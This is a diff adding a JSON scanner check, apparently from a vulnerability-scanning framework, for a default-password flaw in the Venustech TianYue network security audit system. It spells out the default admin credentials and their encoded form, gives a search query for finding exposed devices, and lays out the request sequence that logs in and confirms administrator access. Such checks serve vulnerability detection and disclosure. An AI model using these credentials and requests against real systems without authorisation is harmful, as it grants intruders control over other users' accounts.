@@ -1,0 +1,110 @@
+{
+  "Name": "Venustech TianYue default account",
+  "Description": "Tianyue Network Security Audit System is abbreviated as Tianyue Audit System, which is a compliance management system for fine-grained auditing of network operation behaviors in business environments. The Tianyue network security audit system has a default password vulnerability.",
+  "Product": "Venustech-TianYue",
+  "Homepage": "https://www.venustech.com.cn/new_type/wlsj/",
+  "DisclosureDate": "2019-08-15",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Venustech-TianYue\"",
+  "Level": "2",
+  "Impact": "Attackers can use sysuseradmin:sua_password$123 to enter the background to reset other users' passwords, change other users' password policies, enable and disable other users, change authentication methods and other high-risk operations.",
+  "Recommendation": "",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": false,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+        "AND",
+        {
+            "Request": {
+                "method": "GET",
+                "uri": "/ops/Login",
+                "follow_redirect": false,
+                "header": {"Content-Type": "application/x-www-form-urlencoded"},
+                "data_type": "text",
+                "data": ""
+            },
+            "ResponseTest": {
+                "type": "group",
+                "operation": "AND",
+                "checks": [
+                    {
+                        "type": "item",
+                        "variable": "$code",
+                        "operation": "==",
+                        "value": "200",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$head",
+                        "operation": "contains",
+                        "value": "Set-Cookie",
+                        "bz": ""
+                    }
+                ]
+            },
+            "SetVariable": [
+                "cookie|lastheader|regex|Set-Cookie:(.*?)"
+            ]
+        },
+        {
+            "Request": {
+                "method": "POST",
+                "uri": "/ops/index.php?c=Login&a=Verify",
+                "follow_redirect": false,
+                "header": {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Cookie": "SERVER_ADDR={{{host}}};SERVER_ADDR_FULL={{{hostinfo}}};{{{cookie}}}"
+                },
+                "data_type": "text",
+                "data": "u=sysuseradmin&p=116264704E61706262667E637535202322"
+            },
+            "ResponseTest": {
+                "type": "group",
+                "operation": "AND",
+                "checks": [
+                    {
+                        "type": "item",
+                        "variable": "$code",
+                        "operation": "==",
+                        "value": "200",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "Index",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "param",
+                        "bz": ""
+                    }
+                ]
+            },
+            "SetVariable": ["vulurl|lastbody|variable|{{{scheme}}}://sysuseradmin:sua_password$123@{{{hostinfo}}}/ops/Login"]
+        }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["defaultaccount"],
+  "CVEIDs": null,
+  "CVSSScore": "9.3",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["Venustech-TianYue"]
+  },
+  "Disable": false
+}
